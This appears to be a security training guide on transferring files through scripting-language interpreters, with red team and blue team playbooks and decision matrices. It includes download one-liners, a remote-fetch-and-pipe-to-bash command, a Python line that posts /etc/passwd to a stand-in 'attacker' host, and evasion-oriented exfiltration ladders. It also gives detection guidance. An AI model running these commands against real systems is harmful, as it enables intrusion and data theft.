# Transferring Files with Code

**Technical Report, Red Team Playbooks, and Blue Team Playbooks**

---

## 1. Technical Report: File Transfers Using Programming Languages

---

## 1.1 Why Code-Based File Transfers Matter

In mature environments, defenders often block or monitor **stand-alone file transfer tools** (`wget`, `curl`, `scp`, PowerShell cmdlets, etc.).
However, **programming languages dramatically expand the attack surface**, because:

* Interpreters are commonly installed by default
* Code execution is expected in many workflows
* Network access is indirect and harder to signature
* One-liners reduce forensic footprint

As a result, attackers frequently pivot to **language-based file transfers** once standard tools are restricted.

---

## 1.2 Key Insight: Programming Languages as Universal Transfer Tools

There are hundreds of programming languages, but attackers overwhelmingly rely on a **small, predictable subset**:

* Python
* PHP
* Ruby
* Perl
* JavaScript (Windows-focused)
* VBScript (Windows-focused)

These languages can:

* Download files
* Upload data
* Execute payloads filelessly
* Communicate over HTTP/HTTPS
* Bypass application allowlisting

> **If a language interpreter can reach the network, file transfer is possible.**

---

## 1.3 Python File Transfers

Python is the **most abused interpreter** in modern attacks.

### Why Python Is So Effective

* Installed on most Linux systems
* Frequently present on Windows servers
* Supports one-liners (`-c`)
* Full HTTP client functionality
* Easily blends into admin automation

---

### Python 2 Download

```bash
python2.7 -c 'import urllib; urllib.urlretrieve("URL", "file")'
```

Still relevant on:

* Legacy systems
* Embedded devices
* Old enterprise Linux hosts

---

### Python 3 Download

```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("URL", "file")'
```

Python 3 is now the **default target** for attackers.

---

## 1.4 PHP File Transfers

PHP is **extremely prevalent**, especially on web servers.

### Why PHP Is Abused

* Installed wherever web apps exist
* Can run from CLI (`php -r`)
* Often whitelisted on hardened systems
* Natural fit for HTTP operations

---

### PHP Download Using `file_get_contents()`

```bash
php -r '$f=file_get_contents("URL"); file_put_contents("file",$f);'
```

Simple, readable, and effective.

---

### PHP Download Using `fopen()`

This method:

* Reads remote content in chunks
* Works even when memory is limited
* Bypasses some stream restrictions

```bash
php -r '
$fremote=fopen("URL","rb");
$flocal=fopen("file","wb");
while($b=fread($fremote,1024)){fwrite($flocal,$b);}
fclose($flocal); fclose($fremote);
'
```

---

### PHP Fileless Execution

PHP can stream content directly into another interpreter:

```bash
php -r 'echo implode("",file("URL"));' | bash
```

This mirrors `curl | bash` behavior using PHP instead.

---

## 1.5 Ruby and Perl File Transfers

Ruby and Perl are less common today but still appear on:

* Older servers
* Developer environments
* Specialized tooling systems

---

### Ruby Download

```bash
ruby -e 'require "net/http";
File.write("file", Net::HTTP.get(URI("URL")))'
```

---

### Perl Download

```bash
perl -e 'use LWP::Simple; getstore("URL","file");'
```

These languages are often overlooked by defenders—making them useful fallback options.

---

## 1.6 JavaScript for File Transfers (Windows)

JavaScript is typically used on **Windows systems**, executed via:

* `cscript.exe`
* `wscript.exe`
* `mshta.exe`

### Key Characteristics

* Uses ActiveX objects
* Leverages Windows-native COM components
* Often bypasses PowerShell restrictions

---

### JavaScript Download via `cscript.exe`

The provided script uses:

* `WinHttpRequest`
* `ADODB.Stream`

Executed as:

```cmd
cscript.exe /nologo wget.js URL output.file
```

This is a **classic LOLBin-style transfer**.

---

## 1.7 VBScript for File Transfers (Windows)

VBScript is:

* Installed by default on Windows
* Supported by `cscript.exe`
* Still functional on modern systems

VBScript downloads files using:

* `Microsoft.XMLHTTP`
* `ADODB.Stream`

Execution:

```cmd
cscript.exe /nologo wget.vbs URL output.file
```

This is frequently used when:

* PowerShell is restricted
* Script execution policies are weak

---

## 1.8 Upload Operations Using Code (Python Example)

Downloads get attackers **in**.
Uploads get attackers **paid**.

Uploads are required for:

* Credential exfiltration
* Database dumps
* Packet captures
* Forensic artifacts

---

### Python Upload Using `requests`

```bash
python3 -c '
import requests
requests.post(
  "http://attacker/upload",
  files={"files":open("/etc/passwd","rb")}
)'
```

This method:

* Uses HTTP POST
* Blends into web traffic
* Works with many upload handlers

---

### Code Breakdown (Conceptual)

1. Import HTTP library
2. Define upload endpoint
3. Open file in binary mode
4. Send multipart POST request

This pattern exists in **every modern language**.

---

## 1.9 Cross-Language Generalization

The techniques shown are **not language-specific concepts**.
They demonstrate a general truth:

* Every language has:

  * HTTP clients
  * File I/O
  * CLI execution
* The syntax changes
* The capability does not

Once you understand one language, you can quickly pivot to others.

---

## 1.10 Operational Takeaways

* Language interpreters bypass tool restrictions
* One-liners reduce footprint
* HTTP is the dominant transport
* Fileless execution is trivial
* Uploads are as important as downloads
* Blocking tools ≠ blocking capability

---

# 2. Red Team Playbooks

---

## Red Team Playbook 1: Interpreter Discovery

**Objective:**
Identify usable languages on the target.

**Commands:**

```bash
which python python3 php ruby perl
```

On Windows:

```cmd
where cscript wscript mshta
```

Any interpreter = file transfer potential.

---

## Red Team Playbook 2: Language-Based Fallback Chain

**Objective:**
Guarantee file transfer despite controls.

**Download Order:**

1. `curl` / `wget`
2. Python
3. PHP
4. Ruby / Perl
5. JavaScript / VBScript
6. Base64

Never rely on a single language.

---

## Red Team Playbook 3: Fileless First Strategy

**Objective:**
Avoid disk artifacts.

**Techniques:**

* `python -c 'exec(...)'`
* `php | bash`
* JavaScript streamed execution

Write to disk only when persistence is required.

---

## Red Team Playbook 4: Data Exfiltration

**Objective:**
Upload data quietly.

**Methods:**

* Python `requests`
* HTTPS POST
* Chunked uploads

Small, frequent uploads reduce detection.

---

# 3. Blue Team Playbooks

---

## Blue Team Playbook 1: Interpreter Abuse Detection

**Objective:**
Detect malicious use of scripting languages.

**Indicators:**

* Python/PHP spawned from shells
* Interpreters making outbound HTTP
* One-liners executed from CLI
* Unexpected script execution paths

Languages should not behave like download tools.

---

## Blue Team Playbook 2: Egress + Process Correlation

**Objective:**
Break language-based transfers.

**Controls:**

* Proxy enforcement
* TLS inspection where appropriate
* Correlate outbound traffic with interpreter processes

Network + process = visibility.

---

## Blue Team Playbook 3: LOLBin & Script Engine Monitoring (Windows)

**Objective:**
Detect script-based file transfers.

**High-Risk Binaries:**

* `cscript.exe`
* `wscript.exe`
* `mshta.exe`

Especially when accessing external URLs.

---

## Blue Team Playbook 4: Policy Validation

**Objective:**
Ensure restrictions actually work.

**Tests:**

* Can Python download files?
* Can PHP access external URLs?
* Are interpreters constrained?

Most breaches happen through **assumed restrictions**.

---

## Summary

* Programming languages are universal transfer tools
* Python and PHP dominate real-world abuse
* Windows scripting engines remain highly dangerous
* One-liners enable stealth and speed
* Blocking tools is insufficient
* Egress + behavior is the real control

---

# Code-Based File Transfer Decision Matrix

## 1. Core Principle (Write This at the Top of Your Notes)

> **If an interpreter can execute code and reach the network, file transfer is possible.**

This matrix operationalizes that rule.

---

## 2. Interpreter Availability Matrix

| Interpreter          | Common On          | Default Installed | High-Value? | Notes                       |
| -------------------- | ------------------ | ----------------- | ----------- | --------------------------- |
| Python 3             | Linux, Windows     | Yes (Linux)       | ⭐⭐⭐⭐⭐       | Universal attacker favorite |
| Python 2.7           | Legacy Linux       | Sometimes         | ⭐⭐⭐⭐        | Still found on old servers  |
| PHP                  | Linux, Web servers | Very often        | ⭐⭐⭐⭐        | Web servers = PHP goldmine  |
| Ruby                 | Linux              | Sometimes         | ⭐⭐⭐         | Often overlooked            |
| Perl                 | Linux              | Sometimes         | ⭐⭐⭐         | Legacy but powerful         |
| JavaScript (cscript) | Windows            | Yes               | ⭐⭐⭐⭐⭐       | PowerShell bypass           |
| VBScript             | Windows            | Yes               | ⭐⭐⭐⭐        | Old but effective           |

---

## 3. Download Decision Matrix (Code-Based)

| Constraint             | Best Option                    | Backup           | Why It Works         | Detection Risk |
| ---------------------- | ------------------------------ | ---------------- | -------------------- | -------------- |
| Python available       | `urllib.request.urlretrieve()` | `requests.get()` | Full HTTP client     | Medium         |
| Python only (no tools) | `python -c` one-liner          | Socket HTTP      | No external binaries | Medium         |
| PHP available          | `file_get_contents()`          | `fopen()`        | Common & trusted     | Medium         |
| PHP, no disk writes    | PHP → pipe to bash             | Base64 decode    | Fileless             | High           |
| Ruby available         | `Net::HTTP.get()`              | OpenURI          | Rarely monitored     | Medium         |
| Perl available         | `LWP::Simple`                  | Socket           | Legacy blind spot    | Medium         |
| Windows, PS blocked    | JS + `cscript.exe`             | VBScript         | LOLBins              | High           |
| All tools blocked      | Python socket                  | Bash `/dev/tcp`  | Raw networking       | High           |
| All network blocked    | Base64                         | Chunked Base64   | Offline transfer     | Very High      |

---

## 4. Upload / Exfiltration Decision Matrix (Code-Based)

| Constraint         | Best Option              | Backup         | Why It Works        | Detection Risk |
| ------------------ | ------------------------ | -------------- | ------------------- | -------------- |
| Python available   | `requests.post()`        | urllib POST    | Multipart upload    | Medium         |
| HTTPS allowed      | Python HTTPS POST        | PHP cURL       | Encrypted traffic   | Medium         |
| SSH allowed        | SCP via Python           | Native SCP     | Encrypted + trusted | Low            |
| No uploads allowed | Target-hosted web server | Reverse fetch  | Direction flip      | Medium         |
| Only code allowed  | Base64 encode            | Chunked encode | No network tools    | High           |

---

## 5. Fileless vs On-Disk Matrix (Code)

| Objective            | Recommended    | Why                 |
| -------------------- | -------------- | ------------------- |
| Enumeration          | Fileless       | Low footprint       |
| Payload staging      | On-disk        | Reliability         |
| Privilege escalation | On-disk        | Binary requirements |
| Persistence          | On-disk        | Needs artifacts     |
| EDR present          | Fileless first | Avoid static scans  |

---

## 6. Code-Based Fallback Ladder (Memorize This)

**Downloads**

1. Python (`urllib`)
2. PHP (`file_get_contents`)
3. Ruby / Perl
4. JavaScript / VBScript (Windows)
5. Python socket
6. Base64

**Uploads**

1. Python `requests`
2. PHP POST
3. SCP
4. Base64

If you don’t think in ladders, you stall.

---

## 7. Red-Team Execution Checklist

* [ ] Enumerate interpreters (`which`, `where`)
* [ ] Test outbound HTTP
* [ ] Prefer fileless first
* [ ] Fall back by language, not tool
* [ ] Verify integrity (hashes)
* [ ] Clean up artifacts

---

## 8. Blue-Team Detection Mapping

| Indicator                   | Why It Matters     |
| --------------------------- | ------------------ |
| Python making web requests  | Rare in prod       |
| PHP CLI downloading files   | Very suspicious    |
| `cscript.exe` hitting URLs  | LOLBin abuse       |
| Interpreters piping output  | Fileless execution |
| Multipart POST from servers | Data exfil         |

---

## 9. Defensive Takeaway (Blunt but True)

> **Blocking wget doesn’t matter if Python exists.
> Blocking PowerShell doesn’t matter if cscript exists.
> Blocking tools without blocking behavior is theater.**

---

## 10. One-Line Exam Answer

> **Code-based file transfer relies on abusing language interpreters with network and file I/O to bypass tool-level restrictions.**

